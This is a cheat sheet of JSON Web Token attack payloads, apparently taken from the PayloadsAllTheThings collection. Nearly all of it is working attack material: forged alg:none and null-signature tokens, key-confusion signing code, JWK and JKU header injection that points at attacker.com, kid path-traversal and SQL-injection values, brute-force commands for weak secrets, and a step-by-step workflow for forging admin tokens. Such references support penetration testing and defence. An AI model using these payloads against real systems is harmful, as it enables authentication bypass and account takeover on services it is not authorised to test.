# JWT Attack Payloads

> Source: PayloadsAllTheThings — JSON Web Token

## alg:none Bypass (CVE-2015-9235)

Change algorithm to `none` and remove the signature:

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJsb2dpbiI6ImFkbWluIn0.
```

Algorithm variants to try: `none`, `None`, `NONE`, `nOnE`

```python
import jwt
decoded = jwt.decode(token, options={"verify_signature": False})
forged = jwt.encode(decoded, key='', algorithm=None)
```

```bash
python3 jwt_tool.py [JWT] -X a
```

## Key Confusion — RS256 to HS256 (CVE-2016-5431)

Server uses RS256 (asymmetric) but accepts HS256 (symmetric). Sign with the public key as the HMAC secret.

```bash
# 1. Get public key
openssl s_client -connect target.com:443 | openssl x509 -pubkey -noout > public.pem

# 2. Convert to hex
cat public.pem | xxd -p | tr -d "\\n"

# 3. Sign with public key as HMAC secret
python3 jwt_tool.py [JWT] -X k -pk public.pem
```

```python
import jwt
public = open('public.pem', 'r').read()
payload = {"user": "admin", "role": "admin"}
token = jwt.encode(payload, key=public, algorithm='HS256')
```

## JWK Header Injection (CVE-2018-0114)

Embed attacker's public key in the `jwk` header, sign with corresponding private key:

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "e": "AQAB",
    "n": "<ATTACKER_PUBLIC_KEY_N>"
  }
}
```

```bash
python3 jwt_tool.py [JWT] -X i
```

## JKU Header Injection

Replace `jku` URL with attacker-controlled JWKS endpoint:

```json
{
  "typ": "JWT",
  "alg": "RS256",
  "jku": "https://attacker.com/jwks.json",
  "kid": "attacker-key-id"
}
```

Host this JWKS on your server:

```json
{
  "keys": [{
    "kid": "attacker-key-id",
    "kty": "RSA",
    "e": "AQAB",
    "n": "<ATTACKER_PUBLIC_KEY_N>"
  }]
}
```

```bash
python3 jwt_tool.py [JWT] -X s -ju http://attacker.com/jwks.json
```

## kid Injection

### Directory Traversal

```json
{"alg": "HS256", "typ": "JWT", "kid": "../../dev/null"}
```

Sign with empty string as secret.

```bash
python3 jwt_tool.py [JWT] -I -hc kid -hv "../../dev/null" -S hs256 -p ""
python3 jwt_tool.py [JWT] -I -hc kid -hv "/proc/sys/kernel/randomize_va_space" -S hs256 -p "2"
```

### SQL Injection via kid

```json
{"alg": "HS256", "typ": "JWT", "kid": "key1' UNION SELECT 'secretkey' -- "}
```

### Remote File via kid

```json
{"alg": "RS256", "typ": "JWT", "kid": "http://attacker.com/privKey.key"}
```

## Brute-Force Weak Secrets

```bash
# jwt_tool dictionary attack
python3 jwt_tool.py [JWT] -d /path/to/wordlist.txt -C

# hashcat
hashcat -a 0 -m 16500 jwt.txt wordlist.txt
hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule
hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6
```

Common weak secrets: `secret`, `password`, `your_jwt_secret`, `change_this_super_secret_random_string`

Wordlist: https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list

## Null Signature (CVE-2020-28042)

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.
```

```bash
python3 jwt_tool.py [JWT] -X n
```

## Exploitation Workflow

```bash
# 1. Decode and inspect
python3 jwt_tool.py [JWT]

# 2. Test all attack vectors
python3 jwt_tool.py [JWT] -X a               # alg:none
python3 jwt_tool.py [JWT] -X k -pk pub.pem   # key confusion
python3 jwt_tool.py [JWT] -X i               # JWK injection
python3 jwt_tool.py [JWT] -X s               # JKU injection
python3 jwt_tool.py [JWT] -X n               # null signature
python3 jwt_tool.py [JWT] -d wordlist.txt -C # brute-force

# 3. Forge token with modified claims
python3 jwt_tool.py [JWT] -I -pc role -pv admin -S hs256 -p "secret"
```

## JWKS Endpoints to Probe

```
/.well-known/jwks.json
/jwks.json
/api/v1/keys
/oauth/jwks
/.well-known/openid-configuration
```
